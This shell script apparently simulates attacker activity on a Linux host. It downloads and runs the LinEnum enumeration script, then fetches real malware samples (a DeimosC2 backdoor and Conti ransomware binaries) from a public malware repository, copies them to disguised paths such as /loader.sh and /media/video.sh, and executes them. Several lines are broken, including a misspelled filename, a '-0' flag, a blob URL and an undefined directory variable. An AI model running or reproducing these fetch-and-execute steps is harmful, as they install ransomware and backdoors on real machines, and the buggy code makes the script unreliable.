#!/bin/sh

# SENARIO --- Script Activity /enumeration 
# Step 1 - Download the 
echo "[+] Downloading enumeration script using wget..."
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O enum_script.sh

# Step 2: Make the Enumeration Script Executable
echo "[+] Making the enumeration script executable..."
chmod +x enum_script.sh
sleep 10
# Step 3: Run the Enumeration Script in a Docker Container
echo "[+] Running the enumeration script in a Docker container..."
sh $DOWNLOAD_DIR/enum_script.sh
sleep 3
# SENARIO 1 - Malware 
# STEP 1 -- Ransomware, Back Door, Conti 
echo "[+] Downloading C2 and Ransomware samples..."
# Step 1 - Unix Backdoor Senario 
echo "[+] Downloading Unixbackdoor Script "
wget https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O unixbackdoor.sh
sleep 5
# Create Copies 
echo "[+] Creating copies in suspicious pladces"
cat unixbackdoor.sh > /loader.sh
cp unixbackdoor.sh ~/usr/share
sleep 10 
# make executaable
chmod +x unixbackdoor.sh
# execute 
sh uunixbackdoor.sh

# Step 2 - Conti
echo "[+] Downloading Conti-C2 malware"
  wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -O conti.sh
sleep 5

# Make Executable 
chmod +x conti.sh
sleep 7
#copy, change name and execute 
cp conti.sh /media/video.sh | sh 
sh conti.sh
# Step 3 - c2 
wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -0 c2.sh
sleep 5
# Make Executable 
chmod +x $DOWNLOAD_DIR/c2.sh
sleep 7

